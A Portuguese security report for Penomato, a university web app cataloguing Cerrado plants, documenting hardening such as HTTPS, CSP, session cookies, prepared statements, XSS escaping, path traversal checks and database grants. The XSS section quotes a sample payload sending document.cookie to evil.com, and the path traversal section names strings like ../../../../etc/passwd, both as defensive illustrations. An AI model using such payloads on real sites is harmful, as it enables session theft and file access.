# Relatório de Segurança Implantada — Penomato MVP

**Projeto de Extensão:** Programa de Extensão UFMS Digital (95DX7.200525)
**Projeto de Software:** Penomato — Plataforma de Catalogação de Espécies Nativas do Cerrado
**Referência normativa:** Plano de Desenvolvimento Seguro — Módulo 3 (Boas Práticas em Serviços Web)
**Data de referência:** 2026-04-24
**Responsável técnico:** Norton Oliveira (orientador) / Equipe de desenvolvimento UFMS

---

## 1. Objetivo

Este relatório descreve, de forma consolidada, todas as medidas de segurança aplicadas ao código-fonte do Penomato MVP entre o início do projeto e a presente data. Serve como evidência técnica para o TCC, como guia de manutenção para desenvolvedores futuros e como subsídio para auditorias do Programa de Extensão.

Cada seção identifica: a vulnerabilidade ou risco abordado, a solução implementada, os arquivos afetados, e o commit correspondente no repositório Git.

---

## 2. Resumo Executivo

| Categoria | Itens implementados | Status |
|---|---|---|
| Proteção de transporte (HTTPS) | Redirecionamento HTTP→HTTPS + HSTS | Completo |
| Cabeçalhos HTTP de segurança | 6 cabeçalhos + CSP + bloqueio de arquivos sensíveis | Completo |
| Gerenciamento de sessões | Cookie seguro + regeneração pós-login | Completo |
| Armazenamento de senhas | `password_hash()` + mínimo 8 caracteres | Completo |
| Injeção de SQL | Prepared statements em 100% das queries | Completo |
| XSS | `htmlspecialchars()` em todas as views e saídas de sessão/GET | Completo |
| Validação de entrada | ENUMs + limites de tamanho nos controllers | Parcial |
| Upload de arquivos | MIME validado + permissões 0755 | Parcial |
| Path traversal | `realpath()` + `str_starts_with()` em todos os `unlink()` | Completo |
| Trilha de auditoria | `historico_alteracoes` + `[GESTOR_AUDIT]` nos logs | Completo |
| SRI nas dependências CDN | `integrity` + `crossorigin` em 41 tags, 24 arquivos | Completo |
| Menor privilégio no banco | GRANTs documentados por tabela | Documentado |
| CSRF | Parcialmente mitigado por SameSite=Lax | Pendente (cobertura completa) |
| Rate limiting no login | Bloqueio por IP após tentativas falhas | Completo (desde o início) |
| RBAC no servidor | Verificação de categoria/permissão em cada controller | Completo (desde o início) |

---

## 3. Detalhamento por Item

---

### 3.1 Criptografia em Trânsito — HTTPS Forçado

**Risco endereçado:** Interceptação de dados em trânsito (credenciais, tokens de sessão, dados sensíveis da fauna).

**Commit:** `4dba3fc` — `.htaccess`

**O que foi implementado:**

Duas regras `mod_rewrite` no `.htaccess`:

```apache
# Canonicalização: www → sem www
RewriteCond %{HTTP_HOST} ^www\.penomato\.app\.br$ [NC]
RewriteRule ^ https://penomato.app.br%{REQUEST_URI} [R=301,L]

# Forçar HTTPS com suporte ao proxy reverso da Hostgator
RewriteCond %{HTTP_HOST} ^penomato\.app\.br$ [NC]
RewriteCond %{HTTPS} off
RewriteCond %{HTTP:X-Forwarded-Proto} !https
RewriteRule ^ https://penomato.app.br%{REQUEST_URI} [R=301,L]
```

A condição `X-Forwarded-Proto` é necessária porque a Hostgator termina o TLS em proxy reverso; sem ela `%{HTTPS}` seria sempre `off`, causando loop infinito. Ambas as regras verificam o host de produção antes de agir — não afetam `localhost`.

O HSTS (`Strict-Transport-Security: max-age=31536000; includeSubDomains`) instrui o navegador a exigir HTTPS por 1 ano em visitas futuras, mesmo que o usuário digite o endereço sem `https://`.

---

### 3.2 Cabeçalhos HTTP de Segurança

**Risco endereçado:** Clickjacking, MIME sniffing, vazamento de URL em Referer, carregamento de recursos de origens não autorizadas.

**Commit:** `4dba3fc` — `.htaccess`

**Cabeçalhos implementados:**

| Cabeçalho | Configuração | Ameaça bloqueada |
|---|---|---|
| `X-Frame-Options` | `DENY` | Clickjacking via `<iframe>` |
| `X-Content-Type-Options` | `nosniff` | MIME sniffing de arquivos enviados |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Vazamento de URLs internas em links externos |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | Downgrade de HTTPS para HTTP |
| `Permissions-Policy` | câmera e geolocalização para `self`; demais negados | Acesso não autorizado a APIs de hardware |
| `Content-Security-Policy` | Diretivas por tipo de recurso (ver abaixo) | Injeção de scripts e recursos externos |

**CSP — fontes autorizadas por diretiva:**

| Diretiva | Origens permitidas |
|---|---|
| `script-src` | `'self'`, `cdn.jsdelivr.net`, `unpkg.com`, `code.jquery.com`, `cdnjs.cloudflare.com`, `'unsafe-inline'`¹ |
| `style-src` | `'self'`, `cdn.jsdelivr.net`, `cdnjs.cloudflare.com`, `fonts.googleapis.com`, `unpkg.com`, `'unsafe-inline'`¹ |
| `font-src` | `fonts.googleapis.com`, `fonts.gstatic.com`, `cdnjs.cloudflare.com` |
| `img-src` | `'self'`, `data:`, `tile.openstreetmap.org` |
| `connect-src` | `'self'` |
| `frame-ancestors` | `'none'` |
| `form-action` | `'self'` |
| `object-src` | `'none'` |
| `base-uri` | `'self'` |

¹ `unsafe-inline` é necessário enquanto o projeto mantiver `<script>` e `<style>` embutidos nas views. Remoção está identificada como trabalho futuro.

**Proteção adicional de arquivos:**

- Retorna `403 Forbidden` para acesso direto a `.sql`, `.log`, `.env`, `.json`, `.md`, `.gitignore`, `.lock`
- Bloqueia acesso à pasta `config/` por URL

---

### 3.3 Gerenciamento Seguro de Sessões

**Risco endereçado:** Roubo de cookie de sessão (XSS), session fixation, persistência indevida de sessão.

**Commit:** `4dba3fc` — `src/Controllers/auth/verificar_acesso.php`, `src/Controllers/auth/login_controlador.php`

**Configuração do cookie:**

```php
$cookie_seguro = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on';
ini_set('session.use_strict_mode', '1');

session_set_cookie_params([
    'lifetime' => 0,        // expira ao fechar o navegador
    'path'     => '/',
    'domain'   => '',
    'secure'   => $cookie_seguro,   // apenas HTTPS em produção
    'httponly' => true,             // inacessível via JavaScript
    'samesite' => 'Lax',           // proteção CSRF básica
]);
session_start();
```

**Regeneração pós-login:**

```php
// Após validar credenciais e antes de popular $_SESSION:
session_regenerate_id(true);  // 'true' apaga arquivo de sessão antigo
```

Sem regeneração, um atacante que force um ID de sessão antes do login (`session fixation`) herda a sessão autenticada. O parâmetro `true` elimina a janela de validade do ID anterior.

---

### 3.4 Armazenamento Seguro de Senhas

**Risco endereçado:** Vazamento de senhas em texto claro ou hash fraco caso o banco seja comprometido.

**Implementado desde o início** + **política de mínimo reforçada no commit `4dba3fc`**

**Arquivo:** `src/Controllers/auth/cadastro_controlador.php`

```php
// Cadastro
$senha_hash = password_hash($senha, PASSWORD_DEFAULT);

// Autenticação
password_verify($senha_digitada, $usuario['senha_hash']);

// Validação de tamanho mínimo (adicionada no hardening)
if (empty($senha) || strlen($senha) < 8) {
    $erros[] = "A senha deve ter pelo menos 8 caracteres.";
}
```

`PASSWORD_DEFAULT` usa bcrypt com fator de custo 10, resistente a força bruta mesmo com hardware moderno. O hash nunca é registrado em log.

---

### 3.5 Injeção de SQL — Prepared Statements

**Risco endereçado:** Manipulação de queries via parâmetros maliciosos em campos de formulário ou URL (OWASP A03:2021).

**Implementado desde o início** — 100% das queries do projeto usam prepared statements via PDO com `ATTR_EMULATE_PREPARES => false`.

```php
// Padrão em todo o projeto
$stmt = $pdo->prepare("SELECT id FROM usuarios WHERE email = :email");
$stmt->execute([':email' => $email]);

// Ou via função auxiliar
$usuario = buscarUm("SELECT * FROM usuarios WHERE id = :id", [':id' => $id]);
```

A opção `ATTR_EMULATE_PREPARES => false` obriga o driver a usar prepared statements reais no lado do servidor MySQL — o banco nunca recebe a query com o parâmetro concatenado.

---

### 3.6 Proteção contra XSS — Cross-Site Scripting

**Risco endereçado:** Injeção de JavaScript via campos de formulário ou parâmetros de URL, exibição de HTML arbitrário nas views (OWASP A03:2021).

**Commit:** `4dba3fc` — 24 arquivos de views e controllers

**Vulnerabilidade corrigida mais crítica:**

Em `src/Views/upload_imagens_internet.php`, as mensagens de erro/sucesso vinham de `$_GET` via `urldecode()` e eram ecoadas diretamente:

```php
// ANTES (vulnerável)
echo urldecode($_GET['mensagem_erro'] ?? '');

// DEPOIS (corrigido)
echo htmlspecialchars(urldecode($_GET['mensagem_erro'] ?? ''), ENT_QUOTES, 'UTF-8');
```

Um atacante podia construir uma URL com `?mensagem_erro=<script>document.location='https://evil.com/?c='+document.cookie</script>` e enviar o link para um usuário autenticado.

**Cobertura completa aplicada:**

Todas as variáveis de `$_SESSION['mensagem_erro']`, `$_SESSION['mensagem_sucesso']`, e demais saídas de sessão/GET nas views de autenticação e nas views gerais foram envoltas em `htmlspecialchars($var, ENT_QUOTES, 'UTF-8')`.

---

### 3.7 Validação de Entrada — ENUMs e Limites de Tamanho

**Risco endereçado:** Inserção de valores inesperados em campos com domínio definido; truncamento silencioso pelo MySQL causando corrupção de dados.

**Commit:** `4dba3fc` — `src/Controllers/confirmar_caracteristicas.php`, `src/Controllers/processar_cadastro_exemplar.php`

**Campos com ENUM validado:**

| Campo | Valores aceitos |
|---|---|
| `forma_folha` | Lanceolada, Linear, Elíptica, Ovada, Orbicular, Cordiforme, Espatulada, Sagitada, Reniforme, Obovada, Trilobada, Palmada, Lobada |
| `filotaxia_folha` | Alterna, Oposta Simples, Oposta Decussada, Verticilada, Dística, Espiralada |
| `tamanho_folha` | Microfilas (< 2 cm), Nanofilas (2–7 cm), Mesofilas (7–20 cm), Macrófilas (20–50 cm), Megafilas (> 50 cm) |
| `possui_espinhos` / `possui_latex` / `possui_seiva` / `possui_resina` | Sim, Não |
| `bioma` | Cerrado, Mata Atlântica, Pantanal, Caatinga, Amazônia, Pampa, Outro |

Valores inválidos são silenciosamente definidos como `null` (e não retornam erro) porque esses campos são preenchidos por IA — o modelo pode eventualmente retornar variantes não previstas.

---

### 3.8 Upload de Arquivos

**Risco endereçado:** Upload de web shells, arquivos executáveis disfarçados de imagem; escalonamento de privilégios via diretórios com permissão excessiva.

**Commit:** `4dba3fc` — 4 controllers de upload

**Permissões de diretório corrigidas:**

```php
// ANTES (vulnerável em servidor compartilhado)
mkdir($pasta, 0777, true);

// DEPOIS
mkdir($pasta, 0755, true);
```

Em hospedagem compartilhada Linux, `0777` permite que qualquer processo do servidor escreva na pasta. Com `0755`, apenas o usuário do processo PHP pode criar arquivos.

**Validação de MIME (já existente, mantida):** Todos os uploads verificam o tipo real do arquivo com `finfo_file()` e rejeitam extensões fora da lista branca.

---

### 3.9 Proteção contra Path Traversal

**Risco endereçado:** Um valor malicioso como `../../../../etc/passwd` ou `../config/producao.php` em um campo que alimenta `unlink()` poderia apagar arquivos arbitrários do servidor.

**Commit:** `4dba3fc` — 5 controllers

**Arquivos corrigidos:**
- `src/Controllers/gerenciar_especie.php`
- `src/Controllers/desfazer_acao.php`
- `src/Controllers/aprovacao_acoes.php`
- `src/Controllers/usuario/atualizar_perfil_controlador.php`

**Padrão aplicado em todos os `unlink()`:**

```php
$_raiz_uploads = realpath(__DIR__ . '/../../uploads');

$caminho_real = realpath($arquivo_do_banco);
if ($caminho_real && str_starts_with($caminho_real, $_raiz_uploads . DIRECTORY_SEPARATOR)) {
    unlink($caminho_real);
}
```

`realpath()` resolve todos os `../` e symlinks antes da comparação. A verificação `str_starts_with()` garante que o arquivo pertence à árvore de uploads e não a nenhum outro diretório do servidor.

**Bug adicional corrigido:** Os controllers usavam `__DIR__ . '/../../../'` (3 níveis acima), que resolvia para `htdocs/` em vez de `penomato_mvp/`. Corrigido para `../../`.

---

### 3.10 Trilha de Auditoria

**Risco endereçado:** Ausência de evidências sobre quem fez o quê e quando — impede investigação de incidentes e responsabilização.

**Commit:** `4dba3fc` — `gerenciar_especie.php`, `gestao_especies.php`, `controlador_gestor.php`

**Dois mecanismos complementares:**

**A) Tabela `historico_alteracoes`** — para ações sobre espécies:

```sql
INSERT INTO historico_alteracoes
    (especie_id, id_usuario, tabela_afetada, campo_alterado,
     valor_anterior, valor_novo, tipo_acao, justificativa)
VALUES (?, ?, 'especies_administrativo', 'status', ?, ?, 'edicao', NULL);
```

Registra valor anterior e novo. Para reversões de status, em vez de deletar o registro anterior, insere nova linha com `justificativa='revert_gestor'` — a evidência da ação original permanece intacta.

**B) `error_log()` com prefixo `[GESTOR_AUDIT]`** — para ações sobre usuários:

```php
error_log(sprintf(
    '[GESTOR_AUDIT] aceitar_membro | gestor_id=%d | membro_id=%d | nome=%s | categoria=%s | ip=%s',
    $gestor_id, $membro_id, $nome, $categoria, $_SERVER['REMOTE_ADDR']
));
```

Usado para gestão de usuários porque `historico_alteracoes` tem FK `especie_id NOT NULL` — não comporta eventos sem espécie associada. O prefixo `[GESTOR_AUDIT]` permite filtrar facilmente nos logs do servidor.

**Imutabilidade da trilha:** O usuário de banco `penomato_app` não tem `DELETE` nem `UPDATE` em `historico_alteracoes` (ver seção 3.12).

---

### 3.11 Subresource Integrity — SRI nas Dependências CDN

**Risco endereçado:** Comprometimento de um CDN externo poderia injetar código malicioso em todos os usuários do Penomato via bibliotecas JavaScript ou CSS.

**Commit:** `4dba3fc` — 24 arquivos de views e controllers

**Escopo:**

41 tags de CDN em 24 arquivos. Hashes SHA-384 calculados via download direto dos arquivos e `hashlib.sha384` do Python.

**Exemplo aplicado:**

```html
<!-- ANTES -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

<!-- DEPOIS -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz"
        crossorigin="anonymous"></script>
```

**Bibliotecas cobertas:**

| Biblioteca | Versão | Hash (SHA-384) |
|---|---|---|
| Bootstrap CSS | 5.3.0 | `9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM` |
| Bootstrap JS | 5.3.0 | `geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz` |
| Bootstrap CSS | 5.3.2 | `T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN` |
| Bootstrap JS | 5.3.2 | `C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL` |
| Font Awesome CSS | 6.4.0 | `iw3OoTErCYJJB9mCa8LNS2hbsQ7M3C0EpIsO/H5+EGAkPGc6rk+V8i04oW/K5xq0` |
| Font Awesome CSS | 6.4.2 | `blOohCVdhjmtROpu8+CfTnUWham9nkX7P7OZQMst+RUnhtoY/9qemFAkIKOYxDI3` |
| jQuery | 3.6.0 | `vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK` |
| jQuery Mask | 1.14.16 | `6LwNpGeYDjlORU0Q5rfxEC8SQO6/FTh/VecUcvFvNx1gLMdX5dm8y1Y739D3lFSW` |
| Leaflet CSS | 1.9.4 | `sHL9NAb7lN7rfvG5lfHpm643Xkcjzp4jFvuavGOndn6pjVqS6ny56CAt3nsEVT4H` |
| Leaflet JS | 1.9.4 | `cxOPjt7s7Iz04uaHJceBmS+qpjv2JkIHNVcuOrM+YHwZOmJGBXI00mdUXEq65HTH` |
| exifr | 7.1.3 | `KrOocIA+lZcNUz2MDavnT/FuX+CbTREJihUi0bp8QUSwhE2AkGTNpv2b7yMbBkx5` |
| Chart.js | 4.4.1 | `9nhczxUqK87bcKHh20fSQcTGD4qq5GhayNYSYWqwBkINBhOfQLg/P5HG5lF1urn4` |

**Exceção:** Google Fonts — URL gerada dinamicamente pelo servidor do Google com parâmetros por navegador; SRI não é compatível com este modelo.

---

### 3.12 Menor Privilégio no Banco de Dados

**Risco endereçado:** Se o usuário de banco da aplicação tiver privilégios de root ou DDL, um ataque de SQL injection bem-sucedido poderia `DROP` tabelas, ler outros bancos ou criar backdoors.

**Commit:** `75d7ec5` — `database/grants_producao.sql`

**Três níveis de acesso definidos:**

| Nível | Tabelas | Privilégios |
|---|---|---|
| CRUD completo | 14 tabelas operacionais | `SELECT, INSERT, UPDATE, DELETE` |
| Somente leitura | `flora_brasil_plantas`, `flora_brasil_sinonimos` | `SELECT` |
| Auditoria imutável | `historico_alteracoes` | `SELECT, INSERT` |

**Explicitamente negados para `penomato_app`:**

- `CREATE`, `DROP`, `ALTER`, `TRUNCATE` — nenhuma DDL
- `GRANT OPTION` — não pode delegar permissões
- `FILE`, `SUPER`, `PROCESS`, `RELOAD` — nenhum privilégio administrativo
- Acesso a qualquer banco além de `penomato`

O nível imutável em `historico_alteracoes` garante que mesmo uma injeção SQL que consiga executar um `DELETE` nessa tabela seja rejeitada pelo próprio banco — a evidência de auditoria sobrevive ao ataque.

---

### 3.13 Rate Limiting no Login

**Risco endereçado:** Ataques de força bruta contra contas de usuários.

**Implementado desde o início** — `src/Controllers/auth/login_controlador.php` + tabela `tentativas_login`

Após N tentativas falhas do mesmo IP dentro de uma janela de tempo, novas tentativas são bloqueadas com mensagem genérica. O contador é zerado após login bem-sucedido.

---

### 3.14 RBAC no Servidor

**Risco endereçado:** Escalada de privilégio por manipulação de URL ou parâmetros POST.

**Implementado desde o início** — `src/Controllers/auth/verificar_acesso.php`

Cada controller verifica a categoria do usuário logado (`$_SESSION['usuario_categoria']`) antes de processar qualquer ação. A verificação ocorre no servidor — esconder links na interface não é considerado controle de acesso.

---

## 4. Vulnerabilidades Conhecidas Pendentes

| Item | Risco | Prioridade |
|---|---|---|
| **CSRF** | Formulários destrutivos (excluir membro, excluir espécie) sem token CSRF. A proteção `SameSite=Lax` mitiga ataques via links externos, mas não cobre ataques de mesma origem. | Alta |
| **`unsafe-inline` no CSP** | Necessário enquanto houver `<script>` e `<style>` embutidos nas views. Um XSS residual ainda consegue executar código inline apesar do CSP. | Média |
| **Validação de entrada incompleta** | ENUMs e limites de tamanho cobertos nos controllers de características e exemplares; outros controllers (ex: sugestões, contestações) ainda sem validação sistemática. | Média |
| **Verificação de integridade de dependências locais** | Bibliotecas servidas pelo próprio servidor (em `assets/`) não têm verificação de integridade automatizada. | Baixa |

---

## 5. Artefatos de Segurança Produzidos

| Artefato | Localização | Finalidade |
|---|---|---|
| Script de grants do banco | `database/grants_producao.sql` | Aplicar privilégios mínimos em produção |
| Checklist de code review | `docs/checklist_code_review.md` | Verificação obrigatória em cada PR |
| Este relatório | `docs/relatorio_seguranca_implantado.md` | Evidência técnica para TCC e auditoria |
| Registro detalhado por item | `docs/seguranca_implementada.md` | Referência técnica de cada prática |

---

## 6. Referência de Commits

| Commit | Descrição |
|---|---|
| `4dba3fc` | security: hardening P6–P11 (validação, path traversal, XSS, audit trail, senha, SRI) |
| `75d7ec5` | security: P15 — menor privilégio no banco (grants_producao.sql) |
| `1dca588` | docs: checklist formal de code review (P19) |

Os commits anteriores a `4dba3fc` (início do projeto) já incluíam prepared statements, `password_hash()`, RBAC e rate limiting.
